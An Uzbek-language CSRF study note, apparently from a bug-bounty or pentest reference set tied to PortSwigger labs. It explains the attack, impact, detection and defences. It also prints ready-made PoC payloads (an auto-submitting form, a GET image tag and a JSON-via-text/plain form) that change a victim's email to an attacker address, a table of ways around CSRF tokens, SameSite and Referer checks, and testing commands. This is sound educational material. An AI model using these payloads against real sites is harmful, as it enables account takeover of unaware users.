# Cross-Site Request Forgery (CSRF)

> Lab yechimlari (PortSwigger'ning 11 ta labi) → `LABS.md`. Bu fayl — to'liq nazariya + payload + tool.

## Nima bu? (tushuncha)
Qurbon target saytga login bo'lib turgan paytda sening (attacker) sahifangga kirsa, sahifang
target saytga so'rov yuboradi. Brauzer o'sha domen cookie'sini **avtomat qo'shib yuboradi** —
natijada so'rov qurbonning huquqi bilan bajariladi, lekin qurbon bilmaydi. Ya'ni sen qurbonning
**qo'li bilan** biror harakatni (email o'zgartirish, pul o'tkazish) bajartirasan.

**Ildiz sabab:** server so'rovning **haqiqatan o'sha saytdan kelganini** tekshirmaydi — faqat
cookie bor-yo'qligiga ishonadi. Cookie esa cross-site so'rovlarda ham avtomat ketadi. Yechim:
so'rov manbasini isbotlovchi narsa (CSRF token, SameSite cookie) talab qilish.

## Qanday ishlaydi
```
1. Qurbon target.com ga login (cookie bor).
2. Qurbon attacker.com sahifasini ochadi (ichida auto-submit forma → target.com).
3. Brauzer target.com cookie'sini avtomat qo'shadi → amal qurbon nomidan bajariladi.
```

## Oqibatlar (IMPACT) — nega bu muhim
- **Email/parolni o'zgartirasan** → parol tiklash orqali to'liq account takeover.
- Pul o'tkazish, sozlama o'zgartirish, obuna, ma'lumot o'chirish.
- Admin'da bo'lsa → user yaratish/o'chirish, rol berish.
> O'zi odatda **Medium**, lekin email/parol o'zgartirishga ulansa → **ATO = High**.

## Shartlar (3 tasi ham kerak)
1. Qiziqarli harakat bor (email o'zgartirish va h.k.).
2. Cookie-based session (brauzer avtomat yuboradi).
3. Parametrlar bashorat qilsa bo'ladigan (yashirin, random emas).

## Aniqlash
- So'rovda CSRF token **yo'qmi**? → zaif bo'lishi mumkin.
- Token bor, lekin olib tashlasang ham ishlaydimi?
- Boshqa user'ning tokeni ishlaydimi? (user'ga bog'lanmagan)
- `SameSite` cookie yo'qmi yoki `None`mi?
- GET bilan ham o'zgartirsa bo'ladimi?

## Exploit — asosiy PoC (POST)
```html
<form action="https://target.com/email/change" method="POST">
  <input type="hidden" name="email" value="hacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

## GET bo'lsa — bir qatorda
```html
<img src="https://target.com/email/change?email=hacker@evil.com">
```

## JSON body bo'lsa
```html
<form action="https://target.com/api/email" method="POST" enctype="text/plain">
  <input name='{"email":"hacker@evil.com","x":"' value='"}'>
</form>
```
> `Content-Type: application/json` majburiy + preflight bo'lsa CSRF qiyinlashadi (CORS himoya).

## Token/himoyani bypass
| Himoya zaifligi | Bypass |
|------------------|--------|
| Token faqat POST'da tekshiriladi | Method'ni GET qil |
| Token bor-yo'qligi tekshiriladi, qiymati emas | Token param'ni butunlay o'chir |
| Token user'ga bog'lanmagan | O'z akkauntingdagi valid tokenni ishlat |
| Referer bilan bog'liq | Referer'ni spoofla / olib tashla |
| SameSite=Lax | top-level GET baribir cookie yuboradi — GET endpoint qidir |

### Referer bypass
```html
<meta name="referrer" content="no-referrer">
<!-- yoki domenni "ichiga oladimi" deb tekshirsa -->
https://attacker.com/?target.com
https://target.com.attacker.com/
```

## TOOLLAR

### Burp — CSRF PoC generator
```
So'rovga o'ng tugma → Engagement tools → Generate CSRF PoC
```
> Tayyor HTML PoC yasaydi, auto-submit bilan — to'g'ridan-to'g'ri reportga qo'yasan.

### XSRFProbe — avtomat CSRF audit
```bash
xsrfprobe -u "https://target.com/account" --crawl
```
> Saytni crawl qilib, token yo'q yoki zaif joylarni o'zi topadi.

### curl — token tekshiruvini sinash
```bash
curl -s -X POST "https://target.com/email/change" -H "Cookie: session=..." -d "email=x@x.com"
```
> Token'siz so'rov o'tib ketsa — CSRF tasdiqlandi (javob 200 bo'lsa).

## PoC
To'liq ATO ko'rsat: HTML faylni qurbon ochganda uning emaili o'zgarishini video qil.

## Himoya
CSRF token (per-session/per-request, user'ga bog'langan), `SameSite=Strict/Lax`,
muhim harakatga qayta-auth (parol so'rash), custom header talab qilish.
